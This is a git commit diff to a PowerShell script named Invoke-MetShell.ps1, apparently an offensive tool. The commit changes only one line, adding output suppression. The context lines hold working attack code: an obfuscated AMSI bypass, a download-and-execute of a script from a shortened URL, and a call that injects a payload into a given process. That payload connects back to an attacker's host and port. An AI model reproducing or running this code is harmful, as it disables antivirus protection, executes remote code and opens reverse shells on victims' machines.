64105cde3ee8e0d275f0cda1c0115d504e88b482
b4rtik <andrea.ghelli@gmail.com>
2018-10-05 23:09:36 +0200

    Update Invoke-MetShell.ps1

--- Scripts/Invoke-MetShell.ps1
+++ Scripts/Invoke-MetShell.ps1
@@ -79,7 +79,7 @@ function Invoke-MetShell
 		[Ref].Assembly.GetType('System.M'+'ana'+'gement.Automation.A'+'msi'+'Uti'+'ls')."GetFie`ld"('ams'+'iIni'+'tFa'+'iled','NonPublic,Static').SetValue($null,$true);          
 		iex((New-Object system.net.webclient).DownloadString('https://goo.gl/ks6EMR'));
 		Invoke-Mycode -ProcessId $args[0] -Lhost $args[1] -Lport $args[2];
-	} -ArgumentList @($procId, $lhost, $lport) -RunAs32
+	} -ArgumentList @($procId, $lhost, $lport) -RunAs32 | Out-null
     }
     else
     { 
